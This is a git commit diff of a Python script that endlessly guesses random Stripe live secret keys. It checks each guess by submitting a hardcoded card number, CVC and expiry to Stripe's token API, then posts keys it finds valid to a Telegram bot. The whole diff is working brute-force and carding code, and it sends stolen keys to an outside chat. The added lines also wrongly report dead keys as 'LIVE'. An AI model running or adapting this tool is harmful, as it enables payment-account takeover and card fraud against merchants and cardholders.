2f50bf1b0d5885f9375d8ec271fe9a376278a80b
Mr Vishal <67860986+Mrvishal2k2@users.noreply.github.com>
2022-03-10 19:46:21 +0530

    Update main.py

--- main.py
+++ main.py
@@ -4,16 +4,24 @@ import requests, \
        os
 
 token = os.environ.get("BOT_TOKEN")
-chatid = os.environ.get("FORWARD_ID","-1001566858781")
+chatid = os.environ.get("FORWARD_ID",\
+            "-1001566858781")
     
 def short_key():
   skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
-  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
+  pos = requests.post(
+        url="https://api.stripe.com/v1/tokens",
+        headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
+        data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, 
+        auth=(skkey, ""))
+
   if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
     print(f"DEAD > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+
   else:
     print(f"LIVE > {skkey}")
     requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
-    
+
 while 1:
   short_key()
